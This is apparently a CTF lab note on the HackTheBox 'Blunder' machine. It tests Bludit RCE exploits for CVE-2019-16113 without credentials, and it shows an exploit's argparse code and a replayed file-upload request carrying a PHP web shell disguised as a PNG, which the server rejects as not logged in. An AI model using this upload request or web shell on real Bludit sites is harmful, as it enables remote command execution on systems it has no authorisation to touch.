# Bludit exploits without login

For [48568](https://www.exploit-db.com/exploits/48568) there's the option to specify creds as arguments.

```shell
root@kali:~/CTF/HTB/Blunder# ./48568.py -h


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


usage: 48568.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND

Bludit RCE Exploit v3.9.2 CVE-2019-16113 By @CyberVaca

optional arguments:
  -h, --help      show this help message and exit
  -u URL          Url Bludit
  -user USER      Username
  -pass PASSWORD  Password
  -c COMMAND      Command to execute
```

It says optional here, but this is misleading because the code which uses argparse required specifying creds.

```python3
def get_args():
    parser = argparse.ArgumentParser(description='Bludit RCE Exploit v3.9.2 CVE-2019-16113  \nBy @CyberVaca')
    parser.add_argument('-u', dest='url', type=str, required=True, help='Url Bludit')
    parser.add_argument('-user', dest='user', type=str,required=True, help='Username')
    parser.add_argument('-pass', dest='password', type=str, required=True, help='Password' )
    parser.add_argument('-c', dest='command', type=str, required=True, help='Command to execute' )
    return parser.parse_args()
```

I also looked at [46060](https://www.exploit-db.com/exploits/46060) and used Burp to replicate the Web request.

```text
POST /admin/ajax/upload-files HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: BLUDIT-KEY=2vdc7mvgt0aatmr9c3h95ki2m5
Upgrade-Insecure-Requests: 1
Content-Length: 415
Content-Type: application/x-www-form-urlencoded

-----------------------------26228568510541774541866388118
Content-Disposition: form-data; name="tokenCSRF"

67987ea926223b28949695d6936191d28d320f20
-----------------------------26228568510541774541866388118
Content-Disposition: form-data; name="bluditInputFiles[]"; filename="poc.php"
Content-Type: image/png

<?php system($_GET["cmd"]);?>

-----------------------------26228568510541774541866388118--

HTTP/1.1 401 User not logged.
Date: Sun, 29 Nov 2020 09:07:54 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

But got 401 User not logged.